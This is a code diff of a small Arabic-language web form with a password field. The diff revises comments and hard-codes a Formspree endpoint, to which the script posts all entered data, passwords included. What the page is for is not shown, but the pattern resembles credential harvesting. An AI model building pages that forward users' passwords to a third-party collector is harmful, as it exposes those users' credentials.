@@ -76,7 +76,7 @@
             
             <div class="form-group">
                 <label for="password">كلمة المرور:</label>
-                <!-- type="password" باش الحروف تظهر في شكل نجوم -->
+                <!-- type="password" تظهر النجوم لحماية كلمة المرور -->
                 <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
             </div>
 
@@ -90,11 +90,8 @@
         const btn = document.getElementById('submitBtn');
         const statusMsg = document.getElementById('status-message');
 
-        // حطيت الـ Form ID الصحيح متاعك هنا مباشرة
-        const formID = "maeqajlq"; 
-
         form.addEventListener('submit', async function(event) {
-            event.preventDefault(); // يمنع فتح صفحات أخرى
+            event.preventDefault(); // يمنع الصفحة من إعادة التحميل أو فتح صفحة أخرى
             
             btn.disabled = true;
             btn.textContent = 'جاري الإرسال...';
@@ -103,7 +100,8 @@
             const formData = new FormData(form);
 
             try {
-                const response = await fetch(https://formspree.io/f/${formID}, {
+                // رابط الإرسال المباشر الخاص بك
+                const response = await fetch('https://formspree.io/f/maeqajlq', {
                     method: 'POST',
                     body: formData,
                     headers: {
@@ -114,7 +112,7 @@
                 if (response.ok) {
                     statusMsg.style.color = 'green';
                     statusMsg.textContent = 'تم إرسال المعلومات بنجاح!';
-                    form.reset();
+                    form.reset(); // يفرغ الخانات بعد نجاح الإرسال
                 } else {
                     statusMsg.style.color = 'red';
                     statusMsg.textContent = 'حدث خطأ، لم يتم الإرسال!';
